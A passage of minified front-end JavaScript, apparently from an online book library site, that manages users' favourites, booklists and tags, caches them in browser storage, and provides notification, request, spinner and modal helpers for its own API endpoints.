$(this).remove(),$(".property_user_tags .property_value .tag").length||$(".property_user_tags").hide(),!1}))},this.removeAllBookTagsInHtml=function(){$(".property_user_tags .property_value .tag").remove(),$(".property_user_tags").hide()},this.updateFavoriteReadlists=function(t,e,n,i){let r="add";"DELETE"==t&&(r="remove");const o=new Request("/papi/booklist/"+e+"/favorite/"+r,{method:t});return new StorybookResponse(o).success((function(t){"function"==typeof n&&n(t)})).error((function(t){"function"==typeof i&&i(t)})).fetch()},this.logout=async function(){const t=new Request("/papi/user/logout",{method:"POST"});return new Promise(((e,n)=>{new StorybookResponse(t).success(e).error(n).fetch()}))}},UserBookmarks=function(t){const e=this,n=parseInt(t)||null;let r=null,o={},s=null,a=null;let l=!1,c=[],u=[];const d=$('\n        <div class="booklists-container">\n            <div class="arrow"></div>\n            <div class="booklists-loading-content"></div>\n            <div class="booklists-content">\n                <div class="booklists"></div>\n                <div class="new-booklist-title">'+i18next.t("Add new booklist")+'</div>\n                <div class="new-booklist-form">\n                    <input placeholder="'+i18next.t("Enter the booklist name")+'" class="new-booklist-name">\n                    <button disabled class="btn-add-new-booklist"><i class="icon icon-pluse-gray"></i><i class="icon icon-plus-white"></i>'+i18next.t("Add to booklist")+"</button>\n                </div>\n            </div>\n        </div>"),h=$('\n        <div class="save-for-later-container">\n            <div class="arrow"></div>\n            <div class="save-for-later-content">\n                <div class="save-for-later-form">\n                    <div class="added-to-favorites-title">'+i18next.t("Saved to your Favorites")+'</div>\n                    <button class="save-for-later-btn"><i class="icon icon-plus-white"></i>'+i18next.t("Add to Favorites")+'</button>\n                    <button class="remove-from-favorites-btn"><i class="icon icon-trash-red"></i>'+i18next.t("Remove from Favorites")+'</button>\n                </div>\n                <div class="save-for-later-title">'+i18next.t("Tags")+'</div>\n                <div class="save-for-later-form">\n                    <ul class="tag-list">\n                        <button class="new-tag-btn"><i class="icon icon-pluse-gray"></i>'+i18next.t("New Tag")+"</button>\n                    </ul>\n                </div>\n            </div>\n        </div>"),f=function(t,e,n){return'<div data-booklist_id="'+t+'" data-readlist_book_id="'+n+'" class="booklists-row"><i class="btn-add-to-booklist icon-bookmark '+(n?"icon-blue active":"")+'"></i>'+e+"</div>"},p=function(t,e,n){const i=$(s+' .bookmarks[data-book_id="'+t+'"] .'+e);n?i.addClass("icon-blue active"):i.removeClass("icon-blue active")},g=function(t,e){const n=$('.booklists-container .booklists-row[data-booklist_id="'+t+'"] i');e?n.addClass("icon-blue active"):n.removeClass("icon-blue active")},m=function(t,e){p(t,"icon-bookmark",!0),g(e,!0)},v=function(t,e){g(e,!1),$(".booklists-container .booklists-row .icon-bookmark.active").length||p(t,"icon-bookmark",!1)},y=function(t){p(t,"icon-heart",!0)},b=function(t){p(t,"icon-heart",!1)},w=async function(t){const e=new StorybookIDB;if(await e.isSupported()){const i=await e.table("userSavedBooks");if(!i)return!1;let r=[];return await i.where("bookId").anyOf(t).and((function(t){return t.userId==n})).each((function(t){r.push(t.bookId)})),r}if((new StorybookLocalStorage).isSupported()){const t=(new StorybookLocalStorage).getByCurrentUser("userSavedBooks");return t||[]}return!1},k=async function(t){const e=new StorybookIDB;if(await e.isSupported()){const i=await e.table("userBooksInBooklists");if(!i)return!1;let r=[];return await i.where("bookId").anyOf(t).and((function(t){return t.userId==n})).each((function(t){r.push(t.bookId)})),r}if((new StorybookLocalStorage).isSupported()){const t=(new StorybookLocalStorage).getByCurrentUser("userBooksInBooklists");return t||[]}return!1},x=async function(t){const e=new StorybookIDB,i=new StorybookLocalStorage;if(await e.isSupported()){const i={userId:n,bookId:parseInt(t)},r=await e.table("userSavedBooks");r&&0==await r.where(i).count()&&r.put(i)}else if(i.isSupported()){let e=i.getByCurrentUser("userSavedBooks");e||(e=[]),e.push(parseInt(t)),i.putByCurrentUser("userSavedBooks",e)}},_=async function(t){const e=new StorybookIDB,i=new StorybookLocalStorage;if(await e.isSupported()){const i=await e.table("userSavedBooks");i&&i.where({userId:n,bookId:parseInt(t)}).delete()}else if(i.isSupported()){let e=i.getByCurrentUser("userSavedBooks");if(e){let n=null,r=!1;for(;-1!==(n=e.indexOf(parseInt(t)));)delete e[n],r=!0;r&&(e=e.filter((function(){return!0})),i.putByCurrentUser("userSavedBooks",e))}}},S=function(t,e){const n=t.offset().left,i=window.innerWidth-(n+t.width()),r=t.width()/2,o=e.width()/2,s=e.find(".arrow");let a=10;n>o&&i>o?a=n-o+r:n>o+10&&i<o+10&&(a=n-o-(o-i)),a=a>10?a:10,s.css("left",n-a-1+r-s.width()/2+"px"),e.css({top:t.offset().top+t.height()+10+"px",left:a+"px"})},C=function(){$(window).resize((function(){const t=$(".booklists-container");if(t.length&&t.is(":visible")){const e=t.data("book_id"),n=$(s+" .bookmarks[data-book_id="+e+"] .btn-booklists");S(n,t)}})),$(document).on("click",`${s} .bookmarks .btn-booklists`,(function(){const t=$(this),e=t.closest(".bookmarks"),n=e.data("book_id"),i=$(".booklists-container");if(e.find("i").tooltip("hide"),i.length){if(n==i.data("book_id"))return void(i.is(":visible")?(i.hide(),$(document).trigger("bookmarks.closedBooklistsPopup")):(S(t,i),i.show(),$(document).trigger("bookmarks.openedBooklistsPopup")));i.remove(),$(document).trigger("bookmarks.closedBooklistsPopup")}$booklistsContainer=d.clone(),$booklistsContainer.data("book_id",n);const r=$booklistsContainer.find(".booklists-loading-content"),o=$booklistsContainer.find(".booklists-content"),s=o.find(".booklists");new StorybookSpinner(r).color("#676767").start(),$("body").append($booklistsContainer),S(t,$booklistsContainer),$(document).trigger("bookmarks.openedBooklistsPopup"),new StorybookResponse("/papi/booklist/current-user/?bookId="+n).success((function(t){if(t.list.length)for(let e in t.list)s.append(f(t.list[e].id,t.list[e].title,t.list[e].readlistBookId));else s.hide();r.hide(),o.show(),a=new SimpleBar(s[0],{autoHide:!1})})).fetch()})),$(document).on("click",".booklists-container .booklists-row",(function(){const t=$(this),n=t.find(".btn-add-to-booklist");if(n.hasClass("disabled"))return;n.addClass("disabled");const i=n.closest(".booklists-container").data("book_id"),r=t.data("booklist_id"),o=t.data("readlist_book_id");n.hasClass("active")?(v(i,r),e.deleteBookFromBooklist({bookId:i,booklistId:r,readlistBookId:o,successCallback:function(){n.removeClass("disabled")},errorCallback:function(){n.removeClass("disabled"),m(i,r)}})):(m(i,r),e.addBookToBooklist({bookId:i,booklistId:r,successCallback:function(e){n.removeClass("disabled");const i=e.book?e.book.id:0;t.data("readlist_book_id",i)},errorCallback:function(){n.removeClass("disabled"),v(i,r)}}))})),$(document).on("keyup change",".booklists-content .new-booklist-name",(function(){$(".booklists-content .btn-add-new-booklist").prop("disabled",!$(this).val().trim().length)})),$(document).on("click",".booklists-content .btn-add-new-booklist",(function(){const t=$(this),n=$(".booklists-content .new-booklist-name"),i=n.val().trim();if(t.is(":disabled")||!i)return;t.prop("disabled",!0).find(".icon").addClass("i-hidden");const r=new StorybookSpinner(t).color("#D9D9D9").start(),o=t.closest(".booklists-container").data("book_id");e.addBookToBooklist({booklistTitle:i,bookId:o,successCallback:function(e){t.prop("disabled",!1).find(".icon").removeClass("i-hidden"),r.stop(),n.val("").trigger("change");const i=e.readlist||{},s=e.readlistBook||{};i.id&&s.id&&($(".booklists-content .booklists").show().find(".simplebar-content").append(f(i.id,i.title,s.id)),a.recalculate(),$(".booklists-content .booklists .simplebar-content-wrapper").animate({scrollTop:$(".booklists-content .booklists .simplebar-content .booklists-row").last().position().top}),m(o,i.id))},errorCallback:function(e){r.stop(),t.prop("disabled",!1).find(".icon").removeClass("i-hidden"),(new StorybookNotify).error(e.error)}})}))},E=()=>{if(!this.hasFunction("onFavoriteClick")){const t=(t,e)=>{switch(t.addClass("disabled"),e.action){case"delete":b(e.bookId),CurrentUser.deleteReadLater(e.bookId,(function(){t.removeClass("disabled")}),"none",(function(){t.removeClass("disabled"),y(e.bookId)}));break;case"add":y(e.bookId),CurrentUser.saveReadLater(e.bookId,(async function(){t.removeClass("disabled")}),"none",(function(){t.removeClass("disabled"),b(e.bookId)}))}};this.setFunctions(t,"onFavoriteClick")}$(document).on("click",s+" .bookmarks .btn-save-for-later",(function(){const t=$(this);if(t.hasClass("disabled"))return;const e={action:t.hasClass("active")?"delete":"add",bookId:parseInt(t.closest(".bookmarks").data("book_id"))};o.onFavoriteClick(t,e)}))},T=async function(){C(),function(){const t=".save-for-later-content .tag-list input",e=function(t,e){const n=t.val(),s=$(".save-for-later-content .tag-list .new-tag-btn");switch(e){case"cancel":t.val("").hide(),o(t);break;case"save":if(!isValidInputString(n)){(new StorybookNotify).error(i18next.t("Invalid tag name")),t.focus();break}const e=$('<li style="display: none">'+n+'<i class="icon icon-cross-black"</li>');s.before(e).fadeIn(),e.fadeIn(),t.val("").hide(),i(n,"add"),r(n,"delete"),o(t),$(".save-for-later-content .save-for-later-btn").trigger("click",{editTag:1});break;case"input":const a=parseInt(n.length);let l=30;a>2&&(l=a<15?10*a:150),t.css("width",l+"px"),o(t)}},n=function(t){return-1!==c.indexOf(t.toLowerCase())},i=function(t,e){switch(t=t.toLowerCase(),e){case"add":-1===c.indexOf(t)&&c.push(t);break;case"delete":const e=c.indexOf(t);-1!==e&&(delete c[e],c=c.filter((function(){return!0})))}},r=function(t,e){switch(e){case"add":-1===u.indexOf(t)&&u.push(t);break;case"delete":const e=u.indexOf(t);-1!==e&&(delete u[e],u=u.filter((function(){return!0})))}if("delete"!=e)"add"!=e||-1===u.indexOf(t)&&u.push(t);else{const e=u;u=[];for(let n in e)e[n]!==t&&u.push(e[n])}},o=function(t){const e="suggestion-list",n=$(".save-for-later-container"),i=n.find("."+e),r=t.val().toLowerCase();if(i.length&&i.remove(),r.length<2)return;const o=$('<ul class="'+e+'"></ul>');for(let t in u)-1!==u[t].toLowerCase().indexOf(r)&&o.append('<li class="row">'+u[t]+"</li>");o.html().length&&(o.css({top:t.position().top+t.height()+8+"px",left:t.position().left+"px"}),n.append(o))};$(window).resize((function(){const t=$(".save-for-later-container");if(t.length&&t.is(":visible")){const e=t.data("book_id"),n=$(s+" .bookmarks[data-book_id="+e+"] .btn-save-for-later");S(n,t)}})),$(document).on("click",s+" .bookmarks .btn-save-for-later",(function(){const t=$(this),e=t.closest(".bookmarks"),i=e.data("book_id"),o=t.hasClass("active")?1:0,s=$(".save-for-later-container");if(e.find("i").tooltip("hide"),s.length){if(!s.data("reload")&&i==s.data("book_id"))return void(s.is(":visible")?(s.hide(),$(document).trigger("bookmarks.closedSaveForLaterPopup")):(S(t,s),s.show(),$(document).trigger("bookmarks.openedSaveForLaterPopup")));s.remove(),$(document).trigger("bookmarks.closedSaveForLaterPopup")}const a=h.clone();a.data("book_id",i),a.find(".save-for-later-btn").data("is_saved",o),o?(a.find(".save-for-later-btn").hide(),a.find(".remove-from-favorites-btn").show()):(c=[],a.data("reload",1),a.find(".save-for-later-btn").hide(),a.find(".added-to-favorites-title").show(),a.find(".save-for-later-btn").data("is_saved",1),y(i),CurrentUser.saveReadLater(i));const l=a.find(".save-for-later-content"),u=l.find(".new-tag-btn");if($("body").append(a),S(t,a),$(document).trigger("bookmarks.openedSaveForLaterPopup"),c.length)for(let t in c)u.before("<li>"+c[t]+'<i class="icon icon-cross-black"></i></li>');l.show(),new StorybookResponse("/papi/user/book/"+i+"/tags/?all").success((function(t){for(let e in t.allTags)n(t.allTags[e].tag)||r(t.allTags[e].tag,"add")})).fetch()})),$(document).on("click",".save-for-later-content .tag-list .new-tag-btn",(function(){$(t).remove(),$input=$('<input type="text"/>'),$(this).hide(),$(this).before($input),$input.focus()})),$(document).on("click",".save-for-later-content .tag-list li .icon",(function(){const t=$(this).closest("li"),e=t.text();i(e,"delete"),r(e,"add"),t.remove(),$(".save-for-later-content .save-for-later-btn").trigger("click",{editTag:1})})),$(document).on("click",".save-for-later-content .save-for-later-btn",(function(t,e){if($(this).prop("disabled"))return;const n=$(".save-for-later-container");let i=[];const r=$(".bookmarks").data("book_id"),o=!!e&&e.outside,s=!!e&&e.editTag,a=$(this).data("is_saved");if($(".save-for-later-content .tag-list li").each((function(t,e){i.push($(e).text())})),!(o&&!a&&!i.length||s&&!a)){if(a||s||(y(r),CurrentUser.saveReadLater(r,null,"none",(function(){b(r)}))),!i.length&&!s)return n.remove(),void $(document).trigger("bookmarks.closedSaveForLaterPopup");s||(n.remove(),$(document).trigger("bookmarks.closedSaveForLaterPopup")),$(document).trigger("onAddedBookToSavedBooks",{tags:i}),new StorybookResponse("/papi/user/book/"+r+"/tags",{tags:i}).fetch()}})),$(document).on("click",".save-for-later-content .remove-from-favorites-btn",(function(){const t=$(this),e=$(".bookmarks").data("book_id");t.hasClass("disabled")||(t.addClass("disabled"),b(e),$(".save-for-later-container").remove(),$(document).trigger("bookmarks.closedSaveForLaterPopup"),CurrentUser.deleteReadLater(e),c=[])})),$(document).on("click",".save-for-later-container .suggestion-list .row",(function(){$(t).val($(this).text()),$(this).closest(".suggestion-list").remove()})),$(document).on("focusout",t,(function(i){if($(".save-for-later-container .suggestion-list").length)return $(this).css("visibility","hidden"),void setTimeout((function(){$(t).trigger("focusout")}),300);const r=$(this).val();return r.length?n(r)?((new StorybookNotify).error(i18next.t("This tag has already existed")),void $(this).focus()):void e($(this),"save"):($(this).remove(),void $(".save-for-later-content .tag-list .new-tag-btn").show())})),$(document).on("keyup",t,(function(t){let i="input";const r=t.keyCode?t.keyCode:t.which;if(27==r)i="cancel";else if(13==r){if(n($(this).val()))return void(new StorybookNotify).error(i18next.t("This tag has already existed"));i="save"}e($(this),i)})),$(document).on("keyup",(function(t){9===(t.keyCode?t.keyCode:t.which)&&$(".save-for-later-container .suggestion-list").remove()}))}(),e.paintOverBookmarkIcons(),$(document).on("click",(function(t){const e=$(t.target),n=$(".save-for-later-container"),i=$(".booklists-container"),r=e.hasClass("btn-booklists"),o=e.hasClass("btn-save-for-later");if(r||e.closest(".booklists-container").length||!i.is(":visible")||($(".booklists-container").hide(),$(document).trigger("bookmarks.closedBooklistsPopup")),n.is(":visible")){const t=$(".save-for-later-container .suggestion-list");if(o||e.hasClass("icon-cross-black")||e.closest(".save-for-later-container").length||e.parent().hasClass("suggestion-list"))e.parent().hasClass("suggestion-list")||t.remove();else{let e=0;n.hide(),$(document).trigger("bookmarks.closedSaveForLaterPopup"),t.length&&(t.remove(),e=300),setTimeout((function(){n.find(".save-for-later-btn").trigger("click",{outside:1}),r&&$(".bookmarks .btn-booklists").trigger("click")}),e)}}})),$(document).on("onAddedBookToSavedBooks",(function(t,e){if(!e||"object"!=typeof e.tags)return;const n=$(".cardBooks .property_user_tags"),r=n.find(".property_value");if(r.html(""),e.tags.length){for(i in e.tags)r.append('<span class="tag label label-info"><a href="/users/saved_books.php?tag='+e.tags[i]+'" style="color:#fff;text-decoration:none;font-size:9pt;" target="_blank">'+e.tags[i]+"</a></span>");n.show()}else n.hide()}))};this.paintOverBookmarkIcons=async function(){if(0==(new StorybookLocalStorage).isSupported())return;let t=[],e=[];const n=$(s+" .bookmarks");n.each((function(){let n=parseInt($(this).data("book_id"));t[n]=$(this),e.push(n)}));const i=await w(e),r=await k(e);i&&r&&(n.show(),t.forEach((function(t,e){-1!==i.indexOf(e)&&t.find(".icon-heart").addClass("icon-blue active"),-1!==r.indexOf(e)&&t.find(".icon-bookmark").addClass("icon-blue active")})))},this.setPage=function(t){r=t},this.setSavedBookTags=function(t){c=t},this.setFunctions=function(t,e){e?o[e]=t:o=t},this.hasFunction=function(t){return o&&o[t]&&"function"==typeof o[t]},this.init=async function(t){if(l)return;l=!0;let e=null;if(t.tooltips&&(e=t.tooltips),this.initTooltips(e),$(document).on("mouseenter",".bookmarks i",(function(){$(".booklists-container, .save-for-later-container").is(":visible")&&$(".bookmarks i").tooltip("hide")})),n)switch((t="object"==typeof t?t:{}).page&&this.setPage(t.page),t.savedBookTags&&this.setSavedBookTags(t.savedBookTags),t.functions&&this.setFunctions(t.functions),await async function(){const t=new StorybookIDB,e=new StorybookLocalStorage;let i=await t.isSupported(),r=null,o=null;if(i){if(0==await t.isValueExpired("userBookmarks",3600))return;r=await t.table("userSavedBooks"),o=await t.table("userBooksInBooklists"),r&&o?(await r.where({userId:n}).delete(),await o.where({userId:n}).delete()):i=!1}else{if(!e.isSupported())return;if(!e.isValueExpired("userBookmarks",3600))return}if(await new StorybookResponse("/papi/user/book/readlater/book-id-list").success((function(t){if(!t.list.length)return;const o=[];t.list.forEach((function(t){i?o.push({userId:n,bookId:parseInt(t)}):o.push(parseInt(t))})),i?r.bulkPut(o):e.putByCurrentUser("userSavedBooks",o)})).fetch(),await new StorybookResponse("/papi/booklist/book-id-list").success((function(t){if(!t.list.length)return;const r=[];t.list.forEach((function(t){i?r.push({userId:n,bookId:parseInt(t.bookId),booklistId:parseInt(t.booklistId)}):r.push(parseInt(t.bookId))})),i?o.bulkPut(r):e.putByCurrentUser("userBooksInBooklists",r)})).fetch(),i)t.putValue("userBookmarks");else{const t=Math.floor(Date.now()/1e3);e.putByCurrentUser("userBookmarks",t)}}(),r){case"favorites":case"search":case"recently":s="#searchResultBox",async function(){C(),E();let t=[],e=[];$(s+" .bookmarks").each((function(){let n=parseInt($(this).data("book_id"));t[n]=$(this),e.push(n)}));const n=await w(e),i=await k(e);n&&i&&(t.forEach((function(t,e){let r=!1;-1!==n.indexOf(e)&&(t.find(".icon-heart").addClass("icon-blue active"),r=!0),-1!==i.indexOf(e)&&(t.find(".icon-bookmark").addClass("icon-blue active"),r=!0),r&&t.show()})),$(document).on("click",(function(t){const e=$(t.target);if(e.hasClass("btn-booklists")||e.closest(".booklists-container").length)return;const n=$(".booklists-container"),i=e.closest(".resItemBox"),r=$('.resItemBox .bookmarks[data-book_id="'+n.data("book_id")+'"]');r.find("i.active").length||i.length&&i.find(r).length||r.hide(),n.hide(),$(document).trigger("bookmarks.closedBooklistsPopup")})),$(document).on("mouseenter",".resItemBox",(function(){$(this).find(".bookmarks").show()})),$(document).on("mouseleave",".resItemBox",(function(){$bookmarks=$(this).find(".bookmarks"),$bookmarks.find("i.active").length||$(".booklists-container").is(":visible")||$bookmarks.hide()})))}();break;case"book":s=".cardBooks",T();break;case"booklistModal":s=".book-info-container",T(),$(document).on("scrollModalContent",(function(t,e){const n=$(".booklists-container"),i=$(".save-for-later-container");n.is(":visible")&&S($(s+" .bookmarks .btn-booklists"),n),i.is(":visible")&&S($(s+" .bookmarks .btn-save-for-later"),i)}))}else L()},this.initTooltips=function(t){if(!navigator.maxTouchPoints){if(!t)return void $(".bookmarks i").tooltip({placement:"bottom",container:"body"});for(const{bookmarkSelector:e,options:n}of t){if(!e||!n)return;const t=$(`.bookmarks i${e}`);n.title&&t.attr("title",n.title);const i=Object.assign({placement:"bottom",container:"body"},n);t.tooltip(i)}}};const L=function(){n||0==(new StorybookLocalStorage).isSupported()||($(".bookmarks").show(),$(document).on("click",".bookmarks .btn-save-for-later, .bookmarks .btn-booklists",(function(){const t=$(this).hasClass("btn-save-for-later")?i18next.t("After authorization, you will be able to save books using the «Add to Favorites» option"):i18next.t("After authorization, you will be able to save books using the «Add to Booklist» option");(new User).showAuthPopup("login",t)})))};this.addBookToBooklist=async function(t){if("object"!=typeof t||!t.bookId)return void("function"==typeof t.errorCallback&&t.errorCallback({error:"Invalid bookId"}));let e=null;if(t.booklistId)e=new StorybookResponse("/papi/booklist/"+t.booklistId+"/add-book/"+t.bookId);else{if(!isValidInputString(t.booklistTitle))return void("function"==typeof t.errorCallback&&t.errorCallback({error:"Invalid booklist name"}));e=new StorybookResponse("/papi/booklist/create",{title:t.booklistTitle,description:t.booklistDescription||"",bookId:t.bookId})}await e.success((async function(e){!async function(t,e){const i=new StorybookIDB,r=new StorybookLocalStorage;if(await i.isSupported()){const r=await i.table("userBooksInBooklists");if(t&&r){const i={userId:n,bookId:parseInt(e),booklistId:parseInt(t)};0==await r.where(i).count()&&await r.put(i)}}else if(r.isSupported()){let t=r.getByCurrentUser("userBooksInBooklists");t||(t=[]),t.push(parseInt(e)),r.putByCurrentUser("userBooksInBooklists",t)}}(e.readlist?e.readlist.id:e.book.readlist_id,t.bookId),"function"==typeof t.successCallback&&t.successCallback(e)})).error((function(e){"function"==typeof t.errorCallback&&t.errorCallback(e)})).fetch()},this.deleteBookFromBooklist=async function(t){"object"==typeof t&&t.bookId&&t.booklistId&&t.readlistBookId?await new StorybookResponse("/papi/booklist/"+t.booklistId+"/remove-book/"+t.readlistBookId).success((async function(e){!async function(t,e){const i=new StorybookIDB,r=new StorybookLocalStorage;if(await i.isSupported()){const r=await i.table("userBooksInBooklists");r&&await r.where({userId:n,bookId:parseInt(e),booklistId:parseInt(t)}).delete()}else if(r.isSupported()){let t=r.getByCurrentUser("userBooksInBooklists");if(t){const n=t.indexOf(parseInt(e));-1!==n&&(delete t[n],t=t.filter((function(){return!0})),r.putByCurrentUser("userBooksInBooklists",t))}}}(t.booklistId,t.bookId),"function"==typeof t.successCallback&&t.successCallback(e)})).error((function(e){"function"==typeof t.errorCallback&&t.errorCallback(e)})).fetch():"function"==typeof t.errorCallback&&t.errorCallback({error:"Invalid options"})},this.deleteBooklist=async function(t){"object"==typeof t&&t.booklistId&&await new StorybookResponse("/papi/booklist/"+t.booklistId+"/delete").success((async function(e){!async function(t){const e=new StorybookIDB,i=new StorybookLocalStorage;if(e.isSupported()){const i=await e.table("userBooksInBooklists");i&&await i.where({userId:n,booklistId:parseInt(t)}).delete()}else i.isSupported()&&i.putByCurrentUser("userBookmarks",0)}(t.booklistId),"function"==typeof t.successCallback&&t.successCallback(e)})).error((function(e){"function"==typeof t.errorCallback&&t.errorCallback(e)})).fetch()},this.publicBooklist=async function(t){"object"==typeof t&&t.booklistId&&await new StorybookResponse("/papi/booklist/"+t.booklistId+"/public").success((async function(e){"function"==typeof t.successCallback&&t.successCallback(e)})).error((function(e){"function"==typeof t.errorCallback&&t.errorCallback(e)})).fetch()},this.addBookToSavedBooks=function(t){const e=$(t.spinnerContainer),n=new StorybookSpinner(e).color("#666666"),i=new Request("/papi/user/book/"+t.bookId+"/readlater");parseInt(t.bookId);return x(t.bookId),e.prop("disabled",!0),new StorybookResponse(i).success((async function(){e.prop("disabled",!1),"function"==typeof t.success&&t.success()})).error((function(n){_(t.bookId),e.prop("disabled",!1),"function"==typeof t.error&&t.error(n)})).spinner(n).fetch()},this.deleteBookFromSavedBooks=function(t){const e=$(t.spinnerContainer),n=new StorybookSpinner(e).color("#666666"),i=new Request("/papi/user/book/"+t.bookId+"/readlater",{method:"DELETE"});return _(t.bookId),CurrentUser.removeAllBookTagsInHtml(),e.prop("disabled",!0),new StorybookResponse(i).success((function(){e.prop("disabled",!1),"function"==typeof t.success&&t.success()})).error((function(n){x(t.bookId),e.prop("disabled",!1),"function"==typeof t.error&&t.error(n)})).spinner(n).fetch()}},StorybookNotify=function(t){t=t||{};const e={danger:"icon-circle-cross",info:"icon-circle-info",success:"icon-circle-check-mark-green",warning:"icon-circle-warning"},n={type:"danger",delay:1e4,mouse_over:"pause",z_index:2e3,placement:{from:"bottom",align:"right"},template:'<div data-notify="container" class="col-xs-11 col-sm-3 alert alert-{0} zlib-alert" role="alert">\n\n            <button type="button" aria-hidden="true" class="close" data-notify="dismiss"><i class="icon icon-cross-black"></i></button>\n\n            <span data-notify="icon"></span>\n\n            <span data-notify="title">{1}</span>\n\n            <span data-notify="message">{2}</span>\n\n            <div class="progress" data-notify="progressbar">\n\n            <div class="progress-bar progress-bar-{0}" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width: 0%;"></div>\n\n            </div>\n\n            <a href="{3}" target="{4}" data-notify="url"></a>\n\n            </div>'};function i(e){t.type=e}function r(n){window.StorybookNotifyStack=window.StorybookNotifyStack||{};const i=MD5(t.type+n);n=t.url?{message:n,url:t.url}:{message:n},e[t.type]&&(n.icon=e[t.type]),window.StorybookNotifyStack[i]&&window.StorybookNotifyStack[i].close(),window.StorybookNotifyStack[i]=$.notify(n,t)}return t=$.extend({},n,t),{info:function(t){i("info"),r(t)},error:function(t){i("danger"),r(t)},success:function(t){i("success"),r(t)},warning:function(t){i("warning"),r(t)},type:i,show:r}},StorybookRequest=function(t,e){let n="GET";e?n=(e=JSON.stringify(e))?"POST":"GET":(t instanceof Element||t instanceof jQuery)&&(e={},$form=$(t),t=$form.attr("action"),$.map($form.serializeArray(),(function(t,n){t.name.indexOf("[]")>=0?(t.name=t.name.replace("[]",""),e[t.name]||(e[t.name]=[]),e[t.name].push(t.value)):e[t.name]=t.value})),e=JSON.stringify(e),n=$form.attr("method"));return new Request(t,{method:n,body:e})},StorybookResponse=function(t,e){t instanceof Request||(t=new StorybookRequest(t,e)),this.request=t,this.notifyEnabled=!0,this.successMessageValue=null,this.spinnerStart=function(){return this.spinnerObj&&this.spinnerObj.start(),this},this.spinnerStop=function(){return this.spinnerObj&&this.spinnerObj.stop(),this},this.successCallback=function(t){},this.errorCallback=function(t){},this.finallyCallback=function(){}};StorybookResponse.prototype={fetch:function(){return this.spinnerStart(),window.fetch(this.request,{credentials:"include"}).then((t=>{try{return t.json()}catch(e){throw new Error(t.text())}})).then((t=>{if(0==t.success)throw new Error(JSON.stringify(t));return this.spinnerStop(),this.successMessageValue&&StorybookNotify({delay:4e3}).success(this.successMessageValue),"function"==typeof this.successCallback&&this.successCallback(t),"function"==typeof this.finallyCallback&&this.finallyCallback(),t})).catch((t=>{let e;if(this.spinnerStop(),"function"==typeof this.finallyCallback&&this.finallyCallback(),-1!==["TypeError","RangeError","EvalError","ReferenceError","SyntaxError","URIError"].indexOf(t.name))throw StorybookNotify({delay:8e3}).error(i18next.t("Something went wrong")),t;try{e=JSON.parse(t.message)}catch(n){e={success:0,error:t.message}}this.notifyEnabled&&StorybookNotify({delay:8e3}).error(e.error?e.error:i18next.t("Something went wrong")),"function"==typeof this.errorCallback&&this.errorCallback(e)}))},fetchHtml:function(){return this.spinnerStart(),window.fetch(this.request).then((t=>{try{return t.text()}catch(e){throw new Error(t)}})).then((t=>(this.spinnerStop(),"function"==typeof this.successCallback&&this.successCallback(t),"function"==typeof this.finallyCallback&&this.finallyCallback(),t))).catch((t=>{throw this.spinnerStop(),"function"==typeof this.finallyCallback&&this.finallyCallback(),this.notifyEnabled&&StorybookNotify().error(t),new Error(t)}))},spinner:function(t){return t instanceof StorybookSpinner||(t=new StorybookSpinner(t)),this.spinnerObj=t,this},disableNotify:function(){return this.notifyEnabled=!1,this},success:function(t){return"function"==typeof t&&(this.successCallback=t),this},error:function(t){return"function"==typeof t&&(this.errorCallback=t),this},finally:function(t){return"function"==typeof t&&(this.finallyCallback=t),this},successMessage:function(t){return this.successMessageValue=t,this}};const StorybookSpinner=function(t,e){e=e||"default","string"==typeof t&&(t="#"+t),t=$(t);this.element=t,this.options=$.extend({},{default:{lines:9,length:5,width:3,radius:5,color:"#ffffff",hideText:!0},button:{lines:9,length:3,width:2,radius:4,color:"#666666",left:"15px"}}[e]),this.spinner=new Spinner(this.options).spin()};StorybookSpinner.prototype={color:function(t){return this.options.color=t,this},length:function(t){return this.options.length=t,this},width:function(t){return this.options.width=t,this},radius:function(t){return this.options.radius=t,this},lines:function(t){return this.options.lines=t,this},left:function(t){return this.options.left=t,this},hideText:function(t){return this.options.hideText=t,this},start:function(){return this.spinner=new Spinner(this.options).spin(),this.element.append(this.spinner.el),this.element.css("position","relative"),this.options.hideText&&(this.element.css("color","transparent"),this.element.css("text-shadow","none")),this},stop:function(){return this.spinner.stop(),this.options.hideText&&(this.element.css("color",""),this.element.css("text-shadow","")),this}};const StorybookModal=function(t){t=t||{};t=$.extend({},{element:null,url:null,width:null,top:null,title:null,formAction:null,formData:null,template:null,templateData:null,container:"Storybook-modal",modalDialogClass:"",autoFocus:!0,bodyPadding:null,footer:null,fullscreen:!1,pretty:null,styles:null},t);const e=$("#"+t.container),n=e.find(".modal-header"),i=e.find(".modal-body"),r=new StorybookSpinner(i).color("#999").length(15).lines(12).width(4).radius(12);this.show=function(){if(e.find(".modal-dialog").css("width",""),e.find(".modal-content").find(".modal-footer").remove(),n.addClass("hidden"),n.find(".modal-title").html(""),i.html(""),e.trigger("show"),e.modal("show"),$(".modal-backdrop").addClass(t.container+"-backdrop"),r.start(),e.find(".modal-dialog").css("width","200px"),i.find(".modal-dialog").css("height","200px"),t.modalDialogClass&&e.find(".modal-dialog").addClass(t.modalDialogClass),t.bodyPadding&&i.css("padding",t.bodyPadding),t.title&&(n.removeClass("hidden"),n.find(".modal-title").html(t.title)),t.fullscreen){let e=.01*window.innerHeight;document.documentElement.style.setProperty("--vh",`${e}px`),t.title&&t.footer?i.css("height","calc(calc(var(--vh, 1vh) * 100) - 55px - 69px)"):t.title?i.css("height","calc(calc(var(--vh, 1vh) * 100) - 55px)"):t.footer&&i.css("height","calc(calc(var(--vh, 1vh) * 100) - 69px)")}else i.css("height","auto");return t.pretty&&e.find(".modal-dialog").addClass("pretty-modal"),t.styles&&e.find(".modal-dialog").css(t.styles),function(){if(t.url)return fetch(t.url).then((t=>t.text()));if(t.element){const e=document.getElementById(t.element),n=e.innerHTML;return t.removeSource&&e.remove(),new Promise((t=>t(n)))}if(t.template){const e=t.template(t.templateData);return new Promise((t=>t(e)))}throw new Error('"url", "element" or "template" option is required')}().then((n=>{r.stop();let o="";const s=document.querySelector(".super-puper-main-container").clientWidth;o="number"==typeof t.width?.96*s>t.width?t.width:s<=480?"auto":s<=600?"80%":"60%":"string"==typeof t.width?t.width:s<=768?"auto":"",t.top&&e.find(".modal-dialog").css("top",t.top),e.find(".modal-dialog").css("width",o),i.find(".modal-dialog").css("height","auto"),i.html(n),e.trigger("contentAdded"),t.footer&&e.find(".modal-content").append(t.footer),t.formData&&$.each(t.formData,(function(t,e){const 